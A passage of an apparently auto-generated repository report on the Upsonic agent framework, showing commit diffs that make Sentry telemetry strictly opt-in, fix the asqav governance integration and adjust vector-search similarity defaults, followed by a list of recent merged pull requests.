+  "bump-minor-pre-major": true
 }
```

**File**: `src/upsonic/__init__.py` (modified, +2/-21)
```diff
@@ -1,34 +1,15 @@
 import importlib
 import os
 import warnings
-from importlib.metadata import PackageNotFoundError, version as get_installed_version
 from pathlib import Path
 from typing import Any
 
+__version__ = "0.76.3" # x-release-please-version
+
 from dotenv import load_dotenv
 
 from upsonic.utils.logging_config import *
 
-
-def _resolve_package_version() -> str:
-    try:
-        return get_installed_version("upsonic")
-    except PackageNotFoundError:
-        pyproject_path = Path(__file__).resolve().parents[2] / "pyproject.toml"
-        if pyproject_path.exists():
-            import re
-            match = re.search(
-                r'^version\\s*=\\s*"(?P<version>[^"]+)"',
-                pyproject_path.read_text(),
-                re.MULTILINE,
-            )
-            if match:
-                return match.group("version")
-        return "0.0.0"
-
-
-__version__ = _resolve_package_version()
-
 warnings.filterwarnings("ignore", category=ResourceWarning)
 warnings.filterwarnings("ignore", category=PendingDeprecationWarning)
 warnings.filterwarnings("ignore", category=DeprecationWarning)
```

---

### Incident Patch 7: `8365a223` (2026-05-01)
**Commit Message**: fix(telemetry): make Sentry strictly opt-in (#583)

* fix(telemetry): make Sentry strictly opt-in (TECH-1428)

Previously upsonic.utils.logging_config called sentry_sdk.init() at import
time with a hard-coded default DSN, replacing the host application's
global Sentry client and shipping error logs to upsonic's project by
default. The bundled LoggingIntegration also monkey-patched
logging.Logger.callHandlers, which broke Temporal workflow sandboxes
([TMPRL1101] _DeadlockError).

Telemetry is now strictly opt-in via enable_telemetry(dsn=...). The DSN
default is removed, sentry_sdk.init() is never called, and an isolated
Client + Scope pair is used (Hub(client) was unsuitable in sentry-sdk 2.x
because its ctor mutates the global isolation scope). LoggingIntegration
is no longer registered, so host logging is left untouched.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthropic.com>

* chore: sync uv.lock with asqav extra from pyproject.toml

The asqav optional dependency was added to pyproject.toml in PR #564
but uv.lock was not regenerated, so every uv run produced a dirty
working tree. Regenerated via uv lock.

Co-Authored-By: Claude Opus 4.7 (1M context) <noreply@anthro

**File**: `src/upsonic/utils/logging_config.py` (modified, +166/-107)
```diff
@@ -12,10 +12,14 @@
     UPSONIC_DISABLE_LOGGING: Tüm logging'i kapat (true/false)
     UPSONIC_DISABLE_CONSOLE_LOGGING: Console logging'i kapat (user-facing apps için)
 
-    # Sentry Telemetry Configuration (ERROR-ONLY by default for performance):
-    UPSONIC_TELEMETRY: Sentry DSN (ya da "false" to disable)
+    # Sentry Telemetry Configuration (STRICTLY OPT-IN):
+    # Telemetry is fully disabled unless the host explicitly sets a DSN.
+    # There is no default DSN — upsonic never ships data to a third party
+    # by default, and never calls sentry_sdk.init() (so the host's own
+    # Sentry configuration is never replaced).
+    UPSONIC_TELEMETRY: Sentry DSN (must be explicitly set; "false" or unset disables)
     UPSONIC_ENVIRONMENT: Environment name (production, development, staging)
-    UPSONIC_SENTRY_SAMPLE_RATE: Traces sample rate (0.0 - 1.0, default: 0.0 for performance)
+    UPSONIC_SENTRY_SAMPLE_RATE: Traces sample rate (0.0 - 1.0, default: 0.0)
     UPSONIC_SENTRY_PROFILE_SESSION_SAMPLE_RATE: Profile sample rate (0.0 - 1.0, default: 0.0)
 
     # Modül bazlı seviye kontrolü:
@@ -25,44 +29,59 @@
     UPSONIC_LOG_LEVEL_AGENT: Sadece agent için
 
 Kullanım:
-    # Otomatik konfigürasyon (import ederken çalışır)
-    from upsonic.utils.logging_config import setup_logging, sentry_sdk
+    from upsonic.utils.logging_config import setup_logging, enable_telemetry
 
-    # Ya da manuel
+    # Logging
     setup_logging(level="DEBUG", log_file="upsonic.log")
 
-    # Sentry tracing kullanımı
-    with sentry_sdk.start_transaction(op="task", name="My Task"):
-        # your code here
-        pass
-
-    # Environment variable ile
-    export UPSONIC_LOG_LEVEL=DEBUG
-    export UPSONIC_TELEMETRY="your-sentry-dsn"
-    export UPSONIC_ENVIRONMENT="production"
+    # Telemetry (opt-in)
+    enable_telemetry(dsn="https://...@sentry.io/123")
+    # or set UPSONIC_TELEMETRY env var and call enable_telemetry() with no args
 """
 
 import logging
 import os
 import sys
 import atexit
-from typing import Optional, Dict, Literal, Any
+from typing import Optional, Dict, Literal, Any, TYPE_CHECKING
 from pathlib import Path
-from dotenv import load_dotenv
+import dotenv
+
+if TYPE_CHECKING:  # for type hints only — never executed at runtime
+    import sentry_sdk
+
+# NOTE: ``sentry_sdk`` is intentionally NOT imported at module top-level.
+# Importing it here would pull the entire Sentry SDK (and its transitive
+# integrations) into every worker that touches upsonic, even when telemetry
+# is disabled. The module-level ``__getattr__`` below performs a lazy import
+# on first attribute access, and ``enable_telemetry()`` reaches the module
+# through that same channel (so existing ``patch(...sentry_sdk)`` tests keep
+# working without modification).
+
+
+def __getattr__(name: str) -> Any:
+    """Lazy module attribute access.
+
+    Defers ``import sentry_sdk`` until something actually reads the
+    ``sentry_sdk`` attribute on this module. Result is cached in module
+    globals so subsequent accesses are free.
+    """
+    if name == "sentry_sdk":
+        import sentry_sdk as _sentry_sdk  # local import — runs once
+        globals()["sentry_sdk"] = _sentry_sdk
+        return _sentry_sdk
+    raise AttributeError(f"module {__name__!r} has no attribute {name!r}")
 
-# Sentry SDK imports
-import sentry_sdk
-from sentry_sdk.integrations.logging import LoggingIntegration
 
 # Load environment variables from current working directory (where user runs their script)
 # This ensures .env is found even when package is installed in site-packages
 cwd = Path(os.getcwd())
 env_path = cwd / ".env"
 if env_path.exists():
-    load_dotenv(env_path, override=False)
+    dotenv.load_dotenv(env_path, override=False)
 else:
     # Fallback: search from current directory upwards (default behavior)
-    load_dotenv(override=False)
+    dotenv.load_dotenv(override=False)
 
 # Log level mapping
 LOG_LEVELS = {
@@ -97,6 +116,13 @@
 _LOGGING_CONFIGURED = 
```

**File**: `tests/unit_tests/test_logging_config.py` (modified, +28/-13)
```diff
@@ -105,21 +105,24 @@ def test_setup_sentry_disabled(self, mock_sentry):
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.logging_config.atexit.register')
     def test_setup_sentry_enabled(self, mock_atexit, mock_sentry):
-        """Test setup_sentry when telemetry is enabled."""
+        """Test setup_sentry uses an isolated Client (not sentry_sdk.init())."""
         os.environ["UPSONIC_TELEMETRY"] = "https://test@sentry.io/123"
 
-        # Force reconfiguration
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        # Sentry should be initialized with DSN
-        mock_sentry.init.assert_called_once()
-        call_kwargs = mock_sentry.init.call_args[1]
+        # init() must NEVER be called — that would replace the host's Sentry client.
+        mock_sentry.init.assert_not_called()
+        # An isolated Client must be constructed with the configured DSN.
+        mock_sentry.Client.assert_called_once()
+        call_kwargs = mock_sentry.Client.call_args[1]
         self.assertEqual(call_kwargs['dsn'], "https://test@sentry.io/123")
 
-        # atexit handler should be registered
+        # Flush handler is registered for graceful shutdown.
         mock_atexit.assert_called_once()
 
     def test_setup_logging_basic(self):
@@ -280,49 +283,61 @@ def tearDown(self) -> None:
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     def test_sentry_environment_config(self, mock_sentry: MagicMock) -> None:
-        """Test Sentry environment configuration."""
+        """Test Sentry config flows through to the isolated Client."""
         os.environ["UPSONIC_TELEMETRY"] = self._TEST_DSN
         os.environ["UPSONIC_ENVIRONMENT"] = "development"
         os.environ["UPSONIC_SENTRY_SAMPLE_RATE"] = "0.5"
 
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        mock_sentry.init.assert_called_once()
-        call_kwargs = mock_sentry.init.call_args[1]
+        mock_sentry.init.assert_not_called()
+        mock_sentry.Client.assert_called_once()
+        call_kwargs = mock_sentry.Client.call_args[1]
         self.assertEqual(call_kwargs['dsn'], self._TEST_DSN)
         self.assertEqual(call_kwargs['environment'], "development")
         self.assertEqual(call_kwargs['traces_sample_rate'], 0.5)
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.package.system_id.get_system_id')
     def test_sentry_user_id_tracking(self, mock_get_system_id: MagicMock, mock_sentry: MagicMock) -> None:
-        """Test Sentry user ID tracking."""
+        """User ID is set on the isolated Scope, not the global SDK."""
         os.environ["UPSONIC_TELEMETRY"] = self._TEST_DSN
         mock_get_system_id.return_value = "test-system-id-123"
 
         from upsonic.utils import logging_config
         logging_config._SENTRY_CONFIGURED = False
+        logging_config._upsonic_client = None
+        logging_config._upsonic_scope = None
 
         setup_sentry()
 
-        mock_sentry.set_user.assert_called_once_with({"id": "test-system-id-123"})
+        # Global sentry_sdk.set_user must NOT be touched (would mutate host scope).
+        mock_sentry.set_user.assert_not_called()
+        # The isolated scope receives the user id.
+        scope_instance = mock_sentry.Scope.return_value
+        scope_instance.set_user.assert_called_once_with({"id": "test-system-id-123"})
 
     @patch('upsonic.utils.logging_config.sentry_sdk')
     @patch('upsonic.utils.package.system_id.get_system_id')
     def test_sentry_user_id_failure_graceful(self, mock_get_system_id: MagicMock, mock_sentry: MagicMock) -> None:
-        """Test Sentry handles system ID fa
```

**File**: `tests/unit_tests/test_telemetry_optin.py` (added, +412/-0)
```diff
@@ -0,0 +1,412 @@
+"""
+TECH-1428: Tests for opt-in telemetry behavior.
+
+The previous behavior had three problems:
+  1. `setup_sentry()` ran at import time, calling `sentry_sdk.init()` and
+     replacing the host application's global Sentry client.
+  2. The DSN defaulted to upsonic's own Sentry project, so any host that
+     didn't explicitly opt out shipped error logs to a third party.
+  3. `LoggingIntegration` was registered globally, monkey-patching
+     `logging.Logger.callHandlers` and breaking sandboxed environments
+     such as Temporal workflows.
+
+Fix surface:
+  * Importing `upsonic.utils.logging_config` MUST NOT call `sentry_sdk.init`.
+  * `setup_sentry()` is now a no-op when `UPSONIC_TELEMETRY` is unset; there
+    is no default DSN.
+  * `enable_telemetry(dsn=...)` is the explicit opt-in entry point and
+    constructs an isolated `sentry_sdk.Client` bound to a local `Hub` —
+    it never calls `sentry_sdk.init()`.
+  * No `LoggingIntegration` is registered.
+  * `capture_exception()` routes through the isolated hub, never the global
+    one.
+"""
+
+import importlib
+import logging
+import os
+import sys
+import unittest
+from unittest.mock import MagicMock, patch
+
+
+def _reset_logging_config_state() -> None:
+    """Reset module-level flags so each test starts from a clean slate."""
+    from upsonic.utils import logging_config
+
+    logging_config._SENTRY_CONFIGURED = False
+    logging_config._upsonic_client = None
+    logging_config._upsonic_scope = None
+
+
+class TestNoImportTimeSideEffects(unittest.TestCase):
+    """Importing the module must not touch the global Sentry SDK.
+
+    These tests run in subprocesses so the fresh-import behavior can be
+    observed without polluting sys.modules for sibling test files (which
+    would leave their top-level ``from upsonic.utils.logging_config
+    import ...`` references bound to an orphan module).
+    """
+
+    def _run_in_subprocess(self, script: str) -> "subprocess.CompletedProcess":
+        import subprocess
+
+        env = os.environ.copy()
+        env.pop("UPSONIC_TELEMETRY", None)
+        # Bypass the repo's .env, which sets UPSONIC_TELEMETRY=false and
+        # would mask the bug we are reproducing.
+        env["DOTENV_DISABLE"] = "1"
+        return subprocess.run(
+            [sys.executable, "-c", script],
+            env=env,
+            capture_output=True,
+            text=True,
+            timeout=30,
+            check=False,
+        )
+
+    def test_importing_module_does_not_call_sentry_init(self) -> None:
+        """Re-importing logging_config must not invoke sentry_sdk.init().
+
+        The original bug shipped a hard-coded default DSN, so even a host
+        that never set UPSONIC_TELEMETRY had its global Sentry client
+        silently replaced.
+        """
+        result = self._run_in_subprocess(
+            "import sys; "
+            "from unittest.mock import patch; "
+            # Stub load_dotenv so the repo's .env cannot reintroduce
+            # UPSONIC_TELEMETRY=false (which would mask the bug).
+            "patch('dotenv.load_dotenv').start(); "
+            "init_calls = []; "
+            "import sentry_sdk; "
+            "sentry_sdk.init = lambda *a, **kw: init_calls.append((a, kw)); "
+            "import upsonic.utils.logging_config; "
+            "print(f'INIT_CALLS={len(init_calls)}')"
+        )
+        self.assertEqual(result.returncode, 0, msg=f"stderr: {result.stderr}")
+        self.assertIn("INIT_CALLS=0", result.stdout)
+
+    def test_importing_module_does_not_register_logging_integration(self) -> None:
+        """No LoggingIntegration may be installed at import time."""
+        result = self._run_in_subprocess(
+            "import sys; "
+            "from unittest.mock import patch; "
+            "patch('dotenv.load_dotenv').start(); "
+            "calls = []; "
+            "import sentry_sdk.integrations.logging as li; "
+            "_orig = li.LoggingIntegratio
```

**File**: `uv.lock` (modified, +14/-1)
```diff
@@ -338,6 +338,15 @@ wheels = [
     { url = "https://files.pythonhosted.org/packages/75/7c/9607852e2bb324fa40a5b967e162dea1b3c76b429cf90b602e4a202c101a/apify_shared-2.2.0-py3-none-any.whl", hash = "sha256:667d4d00ac3cf8091702640547387ac5c72a1df402bbb3923f7a401bc25d9d50", size = 16408, upload-time = "2026-01-15T10:17:13.103Z" },
 ]
 
+[[package]]
+name = "asqav"
+version = "0.3.1"
+source = { registry = "https://pypi.org/simple/" }
+sdist = { url = "https://files.pythonhosted.org/packages/fb/98/caa933c09c5585546d952274f3faec9392223a3b0de17e0dbec06b156ab5/asqav-0.3.1.tar.gz", hash = "sha256:75b9e00498ef5a338faf2d2757928d25e07476494d141f1a120602ae49156640", size = 62867, upload-time = "2026-04-29T21:05:42.133Z" }
+wheels = [
+    { url = "https://files.pythonhosted.org/packages/7b/cc/d688857eeecec9bdfd7b50989355b9f5e4e6a8c655736b9e7d928ec2b274/asqav-0.3.1-py3-none-any.whl", hash = "sha256:160474187a952ad00fafa8a2610d4a992f4568823bdd312e88095662f4b9bfe9", size = 77544, upload-time = "2026-04-29T21:05:40.513Z" },
+]
+
 [[package]]
 name = "async-timeout"
 version = "5.0.1"
@@ -8856,6 +8865,9 @@ dependencies = [
 apify-tool = [
     { name = "apify-client" },
 ]
+asqav = [
+    { name = "asqav" },
+]
 chroma = [
     { name = "chromadb", marker = "python_full_version < '3.14'" },
 ]
@@ -9129,6 +9141,7 @@ requires-dist = [
     { name = "anyio", marker = "extra == 'models'", specifier = ">=4.10.0" },
     { name = "apify-client", marker = "extra == 'apify-tool'", specifier = ">=1.8.1" },
     { name = "apify-client", marker = "extra == 'custom-tools'", specifier = ">=1.8.1" },
+    { name = "asqav", marker = "extra == 'asqav'", specifier = ">=0.2.21" },
     { name = "asyncpg", marker = "extra == 'postgres-storage'", specifier = ">=0.30.0" },
     { name = "azure-core", marker = "extra == 'embeddings'", specifier = ">=1.35.1" },
     { name = "azure-core", marker = "extra == 'models'", specifier = ">=1.35.1" },
@@ -9291,7 +9304,7 @@ requires-dist = [
     { name = "xai-sdk", marker = "extra == 'models'", specifier = ">=1.4.0" },
     { name = "yfinance", marker = "extra == 'tools'", specifier = ">=0.2.66" },
 ]
-provides-extras = ["chroma", "qdrant", "milvus", "weaviate", "pinecone", "faiss", "pgvector", "supermemory", "vectordb", "sqlite-storage", "redis-storage", "postgres-storage", "mongo-storage", "mem0-storage", "storage", "models", "embeddings", "csv-loader", "docling-loader", "docx-loader", "html-loader", "json-loader", "markdown-loader", "pdf-loader", "pdfplumber-loader", "pymupdf-loader", "text-loader", "xml-loader", "yaml-loader", "loaders", "tools", "web", "ocr", "custom-tools", "apify-tool", "crawlee-browser", "gmail-interface", "safety-engine", "slack-interface", "mail-interface", "discord-interface", "otel", "langfuse", "gmail-tool"]
+provides-extras = ["asqav", "chroma", "qdrant", "milvus", "weaviate", "pinecone", "faiss", "pgvector", "supermemory", "vectordb", "sqlite-storage", "redis-storage", "postgres-storage", "mongo-storage", "mem0-storage", "storage", "models", "embeddings", "csv-loader", "docling-loader", "docx-loader", "html-loader", "json-loader", "markdown-loader", "pdf-loader", "pdfplumber-loader", "pymupdf-loader", "text-loader", "xml-loader", "yaml-loader", "loaders", "tools", "web", "ocr", "custom-tools", "apify-tool", "crawlee-browser", "gmail-interface", "safety-engine", "slack-interface", "mail-interface", "discord-interface", "otel", "langfuse", "gmail-tool"]
 
 [package.metadata.requires-dev]
 dev = [
```

---

### Incident Patch 8: `0e4f371d` (2026-04-27)
**Commit Message**: fix: asqav integration bugs

- init asqav before super().__init__ so signing exporter binds to live agent
- pass base_url=None when no endpoint set so SDK keeps /api/v1 default
- fix InMemorySpanExporter import path
- raise on init/export errors instead of swallowing silently
- classify spans by OTel GenAI attrs, not substring match on name
- scope export_audit_json/csv to this provider's agent_id by default
- add [asqav] optional extra

**File**: `pyproject.toml` (modified, +3/-0)
```diff
@@ -43,6 +43,9 @@ dependencies = [
 ]
 
 [project.optional-dependencies]
+asqav = [
+    "asqav>=0.2.21",
+]
 chroma = [
     "chromadb>=1.0.20; python_version < '3.14'",
 ]
```

**File**: `src/upsonic/integrations/asqav.py` (modified, +204/-96)
```diff
@@ -12,20 +12,23 @@
     agent = Agent("openai/gpt-4o", instrument=gov)
     agent.print_do("Analyze quarterly revenue data")
 
-    # Export audit trail
+    # Export audit trail (raises on backend errors so you can debug)
     gov.export_audit_json()
 """
 
 from __future__ import annotations
 
+import logging
 import os
-from typing import Any, Optional, TYPE_CHECKING
+from typing import Any, Callable, Dict, Optional, Tuple, TYPE_CHECKING
 
 from upsonic.integrations.tracing import TracingProvider
 
 if TYPE_CHECKING:
     from opentelemetry.sdk.trace.export import SpanExporter as _SpanExporter
 
+_logger = logging.getLogger(__name__)
+
 
 class AsqavGovernance(TracingProvider):
     """Asqav governance integration for Upsonic agents.
@@ -37,14 +40,22 @@ class AsqavGovernance(TracingProvider):
 
     Args:
         api_key: Asqav API key (``sk_...``).
-            Falls back to ``ASQAV_API_KEY`` env var.
+            Falls back to the ``ASQAV_API_KEY`` env var. If neither is set
+            the constructor raises (use a stub provider if you really want
+            unsigned tracing).
         agent_name: Name for the asqav agent identity.
-            Defaults to ``"upsonic-agent"``.
-        endpoint: Asqav API endpoint.
-            Falls back to ``ASQAV_API_URL`` env var.
-        sign_tool_calls: Sign individual tool call spans.
-        sign_llm_calls: Sign LLM invocation spans.
-        sign_agent_steps: Sign agent reasoning steps.
+            Defaults to ``"upsonic-agent"``. Reused on subsequent runs;
+            asqav returns the existing agent for the same name.
+        endpoint: Override for the asqav API base URL.
+            Falls back to the ``ASQAV_API_URL`` env var. When neither is
+            set the asqav SDK keeps its own (correct) default —
+            ``https://api.asqav.com/api/v1``. Don't hardcode
+            ``https://api.asqav.com`` here: that strips the ``/api/v1``
+            path and breaks every SDK call.
+        sign_tool_calls: Sign spans that look like real tool invocations
+            (per OTel GenAI semantic conventions).
+        sign_llm_calls: Sign spans that look like real LLM invocations.
+        sign_agent_steps: Sign generic agent / pipeline-step spans.
         include_content: Include prompt/response content in traces.
         service_name: Service name reported in traces.
     """
@@ -61,143 +72,240 @@ def __init__(
         include_content: bool = True,
         service_name: str = "upsonic",
     ) -> None:
-        self._api_key = api_key or os.environ.get("ASQAV_API_KEY", "")
-        self._agent_name = agent_name
-        self._endpoint = endpoint or os.environ.get(
-            "ASQAV_API_URL", "https://api.asqav.com"
-        )
-        self._sign_tool_calls = sign_tool_calls
-        self._sign_llm_calls = sign_llm_calls
-        self._sign_agent_steps = sign_agent_steps
-
-        self._asqav = None
-        self._agent = None
-        self._session = None
+        # Resolve api_key from param → env var. Empty string is treated
+        # the same as missing; the asqav SDK will surface a clear
+        # AuthenticationError from _init_asqav() below.
+        self._api_key: Optional[str] = api_key or os.environ.get("ASQAV_API_KEY") or None
+        self._agent_name: str = agent_name
+        # Endpoint: pass-through. ``None`` lets the asqav SDK use its own
+        # correct default which already includes ``/api/v1``.
+        self._endpoint: Optional[str] = endpoint or os.environ.get("ASQAV_API_URL") or None
+        self._sign_tool_calls: bool = sign_tool_calls
+        self._sign_llm_calls: bool = sign_llm_calls
+        self._sign_agent_steps: bool = sign_agent_steps
+
+        self._asqav: Any = None
+        self._agent: Any = None
+        self._session: Any = None
+
+        # Initialize asqav BEFORE super().__init__() because the parent's
+        # __init__ calls _setup() → _create_exporter(), which builds the
+        # signing exporter. The exporter
```

---

### Incident Patch 9: `270cb482` (2026-04-24)
**Commit Message**: docs: fix Cowork capitalization per review

**File**: `README.md` (modified, +1/-1)
```diff
@@ -22,7 +22,7 @@
 
 ## Overview
 
-Upsonic is a Python framework for building autonomous agents like OpenClaw and Claude CoWork, as well as more traditional agent systems.
+Upsonic is a Python framework for building autonomous agents like OpenClaw and Claude Cowork, as well as more traditional agent systems.
 
 ## Quick Start
 
```

---

### Incident Patch 10: `20fe2a40` (2026-04-10)
**Commit Message**: fix: small fix on RAG side

**File**: `src/upsonic/knowledge_base/knowledge_base.py` (modified, +3/-2)
```diff
@@ -1213,9 +1213,9 @@ async def _store_in_vectordb(self, chunks: List[Chunk], vectors: List[List[float
             chunk_hashes: List[str] = [chunk.chunk_content_hash for chunk in chunks]
             chunk_payloads: List[Dict[str, Any]] = [dict(chunk.metadata) for chunk in chunks]
 
+            knowledge_base_ids: Optional[List[str]] = None
             if self.isolate_search:
-                for payload in chunk_payloads:
-                    payload["knowledge_base_id"] = self.knowledge_id
+                knowledge_base_ids = [self.knowledge_id] * len(chunks)
 
             await self.vectordb.aupsert(
                 vectors=vectors,
@@ -1225,6 +1225,7 @@ async def _store_in_vectordb(self, chunks: List[Chunk], vectors: List[List[float
                 document_ids=doc_ids,
                 doc_content_hashes=doc_hashes,
                 chunk_content_hashes=chunk_hashes,
+                knowledge_base_ids=knowledge_base_ids,
             )
             
             success_log(f"Stored {len(chunks)} chunks successfully", context="KnowledgeBase")
```

**File**: `src/upsonic/vectordb/config.py` (modified, +1/-0)
```diff
@@ -539,6 +539,7 @@ class SuperMemoryConfig(BaseVectorDBConfig):
     timeout: float = 60.0
     batch_delay: float = 0.1
     batch_size: int = 50
+    index_delay: float = 7.0  # Seconds to wait after upsert for async indexing to complete
 
     vector_size: int = 0
     dense_search_enabled: bool = False
```

**File**: `src/upsonic/vectordb/providers/chroma.py` (modified, +2/-2)
```diff
@@ -1437,7 +1437,7 @@ async def adense_search(
         _ = apply_reranking  # accepted for API parity; not applied in dense path
         collection = await self._get_active_collection()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
 
         try:
             native_filter, post_filter = self._split_filter(filter)
@@ -1522,7 +1522,7 @@ async def afull_text_search(
         _ = (apply_reranking, sparse_query_vector)  # accepted for API parity; ChromaDB uses BM25-like scoring with no sparse vectors
         collection = await self._get_active_collection()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
 
         where_document_filter = {"$contains": query_text}
         native_filter, post_filter = self._split_filter(filter)
```

**File**: `src/upsonic/vectordb/providers/pinecone.py` (modified, +3/-3)
```diff
@@ -1150,7 +1150,7 @@ async def adense_search(
         if not self._index:
             raise VectorDBConnectionError("Index not available.")
 
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
         include_values: bool = self._config.include_values
 
@@ -1198,7 +1198,7 @@ async def afull_text_search(
             raise ConfigurationError("Full-text search requires use_sparse_vectors to be enabled.")
         
         top_k = top_k or self._config.default_top_k
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
 
         native_filter, post_filter = self._split_filter(filter)
@@ -1269,7 +1269,7 @@ async def ahybrid_search(
         
         top_k = top_k or self._config.default_top_k
         alpha = alpha if alpha is not None else (self._config.default_hybrid_alpha or 0.5)
-        final_threshold: float = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_threshold: float = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         namespace: str = self._config.namespace or ""
         include_values: bool = self._config.include_values
 
```

**File**: `src/upsonic/vectordb/providers/qdrant.py` (modified, +2/-2)
```diff
@@ -1365,7 +1365,7 @@ async def adense_search(
         """
         try:
             client = await self.aget_client()
-            final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+            final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
             
             search_params = models.SearchParams(
                 hnsw_ef=getattr(self._config.index, 'ef_search', None) or 128,
@@ -1441,7 +1441,7 @@ async def afull_text_search(
         _ = (sparse_query_vector,)  # accepted for API parity; Qdrant uses text-index BM25 not sparse vectors
         await self.aget_client()
 
-        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else self._config.default_similarity_threshold or 0.5
+        final_similarity_threshold = similarity_threshold if similarity_threshold is not None else (self._config.default_similarity_threshold if self._config.default_similarity_threshold is not None else 0.0)
         target_text_field: str = self._config.text_search_field
 
         if self._config.connection.mode == Mode.IN_MEMORY:
```

#### Recent Merged Pull Requests:
- **PR #623** (closed): fix(security): isolate MCP stdio server from full os.environ (@Solaris-star)
- **PR #618** (2026-06-18): docs(community): add code of conduct (@IremOztimur)
- **PR #615** (2026-06-15): docs: add SECURITY.md with responsible disclosure policy (@IremOztimur)
- **PR #605** (2026-05-19): chore(master): release 0.77.3 (@github-actions[bot])
- **PR #604** (2026-05-19): New Centralized Usage Metrics (@onuratakan)
- **PR #602** (2026-05-19): TECH-1625: Centralized Usage Registry (replaces legacy incr chain + price_id) (@onuratakan)
- **PR #599** (2026-05-16): chore(master): release 0.77.2 (@github-actions[bot])
- **PR #598** (2026-05-16): fix(chat,messages): tolerate trailing junk in tool args and reset tas… (@onuratakan)

---

## 3. Empirical Evidence & Compliance Certification
- **Evidence Provenance**: Fetched directly from verified official GitHub REST API.
- **Zero Disk Footprint**: 0 bytes of unnecessary repository bloat stored locally.
- **TOS & Free-Tier Adherence**: Request pace complied with public API guidelines without fee, penalty, or unauthorized scraping.

---

## 4. Promotion & Integration Status
- **Status**: HARVESTED_DEEP_FORENSIC
- **Master Brain Sync**: Auto-committed to local/remote Master Brain repository.
